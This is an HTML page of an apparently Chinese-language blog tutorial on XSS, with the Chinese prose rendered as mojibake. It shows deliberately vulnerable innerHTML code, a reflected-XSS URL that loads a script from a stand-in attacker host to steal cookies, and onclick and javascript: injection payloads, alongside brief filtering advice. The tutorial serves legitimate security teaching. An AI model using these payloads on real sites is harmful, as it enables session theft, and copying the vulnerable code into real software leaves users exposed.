<html>
    <head>

        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <link href=/static/css/main.css rel="stylesheet" type="text/css">
        <!--link href=/static/css/github.css
            rel="stylesheet" type="text/css" /-->
        <link rel="stylesheet" href="/pygments.css">
        <title>è·¨ç«™è„šæœ¬æ”»å‡»XSS</title>
    </head>
    <body>
        <h1>è·¨ç«™è„šæœ¬æ”»å‡»XSS</h1>

<p>è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting), ç®€ç§°XSS(é¿å…å’ŒCSSå¼„æ··), æ˜¯é€šè¿‡æ³¨å…¥æ¶æ„JSä»£ç çš„æ–¹å¼è¿›è¡Œhack(ä¸šç•Œç§°ä¸º"æŒ‚é©¬"). è¢«<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>è¯„ä¸ºWebå®‰å…¨çš„æœ€å¤§å¨èƒ.</p>

<h2>æµè§ˆå™¨çš„åŒæºç­–ç•¥</h2>

<p>æµè§ˆå™¨å®‰å…¨çš„åŸºç¡€æ˜¯åŒæºç­–ç•¥(same-origin policy). ç®€å•è¯´, åŒæºç­–ç•¥ä¿è¯æŸä¸ªç½‘ç«™çš„cookie(æ¯”å¦‚é“¶è¡Œçš„login cookie)ä¸è¢«åˆ«çš„ä¸åŒæºç½‘ç«™è¯»å–(æ¯”å¦‚æ¶æ„ç½‘ç«™ğŸ˜). <br/>
åŒæºçš„ç½‘ç«™æŒ‡è¿™"3åŒ":</p>

<ul>
<li>åŒåè®®</li>
<li>åŒåŸŸå(åŸŸåçº§åˆ«ä¹Ÿè¦ç›¸åŒ)</li>
<li>åŒç«¯å£</li>
</ul>

<p>å¦‚æœè®¾ç½®äº†<strong>document.domain</strong>, é‚£ä¹ˆåŸŸåçº§åˆ«ä¸åŒä¹Ÿç®—åŒæº. <br/>
åŒæºç­–ç•¥é™¤äº†å½±å“<strong>cookie</strong>çš„è¯»å†™, è¿˜å½±å“<strong>localStorage</strong>ã€<strong>indexDB</strong>çš„è¯»å†™, <strong>iframe</strong>çˆ¶çª—å£å’Œå­çª—å£é—´é€šä¿¡, é€šè¿‡<strong>ajax</strong>å‘é€httpè¯·æ±‚. <br/>
æ›´å¤šå…³äºåŒæºä»¥åŠè§„é¿åŒæºç­–ç•¥çš„æ–¹æ³•å‚è€ƒ: <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">é˜®ä¸€å³°:æµè§ˆå™¨åŒæºæ”¿ç­–åŠå…¶è§„é¿æ–¹æ³•</a> <br/>
è™½ç„¶åŒæºç­–ç•¥å¤§å¤§å¢åŠ äº†è·¨ç«™æ”»å‡»çš„éš¾åº¦, ç„¶è€Œç¨‹åºæ˜¯äººå†™çš„, å¯èƒ½æœ‰å‡ºé”™çš„åœ°æ–¹, è¿™äº›åœ°æ–¹å°±æ˜¯XSSæ”»å‡»çš„çˆ†ç ´ç‚¹!</p>

<h2>XSSæ”»å‡»åˆ†ç±»</h2>

<p>æ ¹æ®è§¦å‘æ¶æ„ä»£ç æ³¨å…¥çš„åœºæ™¯, XSSæ”»å‡»å¯ä»¥åˆ†ä¸ºä»¥ä¸‹3ç±»:</p>

<ul>
<li>åå°„å‹XSS</li>
<li>å­˜å‚¨å‹XSS</li>
<li>Dom-Based XSS</li>
</ul>

<p>åå°„å‹XSSéœ€è¦ä¾é ç”¨æˆ·ç‚¹å‡»æŸä¸ªé“¾æ¥è§¦å‘XSSä»£ç æ³¨å…¥. <br/>
æ¯”å¦‚<code>www.bank.com/123/?name=neo1218</code>ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç :</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>

<p>ä»æŸ¥è¯¢å‚æ•°è·å–å¹¶æ˜¾ç¤ºusername. è¿™é‡Œçš„æŸ¥è¯¢å‚æ•°å°±å¯ä»¥ä½œä¸ºä¸€ä¸ªXSSæ³¨å…¥ç‚¹:</p>

<div class="codehilite"><pre><span></span>www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></div>

<p>ç‚¹å‡»è¯¥é“¾æ¥å°±å¯ä»¥åŠ è½½xss.js, å¹¶è·å–ç”¨æˆ·cookie:<code>document.cookie</code>
<img alt="screen shot 2017-04-17 at 17 14 59" src="https://cloud.githubusercontent.com/assets/10671733/25084869/97d8c9f0-2391-11e7-92ed-d017afe5800f.png" />
<br/>
å­˜å‚¨å‹XSSæ›´å¼ºå¤§å’ŒæŒä¹…, åˆ©ç”¨ä¸€äº›äº¤äº’ä¸Šä¼ åœºæ™¯(ä¸Šä¼ åšå®¢ã€ä¸Šä¼ æ–‡ä»¶), hackerå¯ä»¥æŠŠXSSè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š, è¿›è€Œæ¯ä¸ªç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™å°±ä¼šåŠ è½½æ¶æ„è„šæœ¬. è¿™äº›åœ°æ–¹é€šå¸¸ä¹Ÿå¯ä»¥è¿›è¡Œsqlæ³¨å…¥æ”»å‡».
<br/>
Dom-Based XSSå…¶å®ä¹Ÿæ˜¯åå°„å‹XSSçš„ä¸€ç§, æ¶æ„ä»£ç å¯ä»¥é€šè¿‡ä¿®æ”¹DOMèŠ‚ç‚¹è¢«æ³¨å…¥(æ¯”å¦‚innerHTML).</p>

<h2>XSSæ”»å‡»åŠé˜²å¾¡</h2>

<h3>æ¼æ´: ç”¨æˆ·å¯ä»¥æ§åˆ¶URLè¿›è€Œä¿®æ”¹DOMèŠ‚ç‚¹</h3>

<p>ä»£ç :</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>

<p>æ”»å‡»:</p>

<div class="codehilite"><pre><span></span>è¯±éª—ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥:
www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
åŠ è½½XSS payloadè¿›è¡Œæ”»å‡».
</pre></div>

<p>é˜²å¾¡:</p>

<div class="codehilite"><pre><span></span>ä¸€èˆ¬ç”¨æˆ·è¾“å…¥æ˜¯ä¸éœ€è¦&lt;script&gt;çš„, å¯ä»¥è¿‡æ»¤&lt;script&gt;æ ‡ç­¾.
</pre></div>

<p>ä¸è¿‡è¿‡æ»¤äº†scriptæ ‡ç­¾, ä¾ç„¶æœ‰å¯èƒ½è¢«æ”»å‡»: </p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;&lt;a href=http://www.bank.com/&quot;</span> <span class="o">+</span> <span class="o">\</span>
               <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&gt;&quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/a&gt;&lt;/div&gt;&quot;</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

æ„é€ æ¶æ„URL:
www.bank.com/123/?name= onclick=alert(hack xss)
</pre></div>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">http://www.bank.com/</span>  <span class="na">onclick</span><span class="o">=</span><span class="s">alert(hack</span> <span class="na">xss</span><span class="err">)</span><span class="p">&gt;</span>....<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>

<p>è¿™æ¬¡æ”»å‡»åˆ©ç”¨äº†JSäº‹ä»¶. æ‰€ä»¥å¯¹URLçš„è½¬ä¹‰éœ€è¦å½»åº•, æµè§ˆå™¨åœ°å€æ ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰,
æ¯”å¦‚ç©ºæ ¼è½¬ä¹‰æˆ%20, " è½¬ä¹‰æˆ%22, é¿å…æ„æˆæ˜ç¡®çš„è¯­ä¹‰. <br/>
ç„¶è€Œå½»åº•è½¬ä¹‰ä¹Ÿå­˜åœ¨æ¼æ´, è€ƒè™‘åˆ°URLçš„å®Œæ•´æ€§, åè®®å’ŒåŸŸåä¸­çš„ç‰¹æ®Šå­—ç¬¦(æ¯”å¦‚'/', '.')æ˜¯ä¸è¿›è¡Œè½¬ä¹‰çš„, å¦‚æœç”¨æˆ·å¯ä»¥æ§åˆ¶æ•´ä¸ªURL, é‚£ä¹ˆhackerå¯ä»¥é€šè¿‡ä¼ªé€ åè®®è¿›è¡Œå…¥ä¾µ:</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(hack xss);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
è¿™é‡Œä¼ªé€ åè®®(javascript)å’ŒåŸŸå(alert(hack css);)å‘åŠ¨æ”»å‡».
</pre></div>

<p><br/></p>

<h2>XSSè •è™«</h2>
        <div id="disqus_thread"></div>
        <script>
        /**
        * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
        * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
        */
        /*
        var disqus_config = function () {
        this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
        };
        */
        (function() { // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');

        s.src = '//neo1218flask.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
        })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
    </body>
</html>
